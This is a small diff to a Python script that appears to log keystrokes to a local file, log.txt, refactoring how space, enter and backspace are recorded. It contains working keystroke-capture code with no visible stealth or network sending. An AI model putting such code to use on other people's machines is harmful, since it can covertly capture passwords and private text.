@@ -4,19 +4,15 @@ keyboard = Controller()
 # write for easy debugging
 f = open("log.txt", "w")
 
+ks = {Key.space: " ", Key.enter: "[ENTER]\n", Key.backspace: "[BACKSPACE]"}
+
 
 def on_release(key):
     # print(f"Key {key} pressed")
-    if key == Key.space:
-        key = " "
-    elif key == Key.enter:
-        key = "[ENTER]\n"
-    elif key == Key.backspace:
-        key = "[BACKSPACE]"
-    elif key == Key.esc:
+    if key == Key.esc:
         # stop listener
         return False
-    f.write(str(key).replace("'", ""))
+    f.write(ks.get(key, str(key)).replace("'", ""))
 
 
 def main():
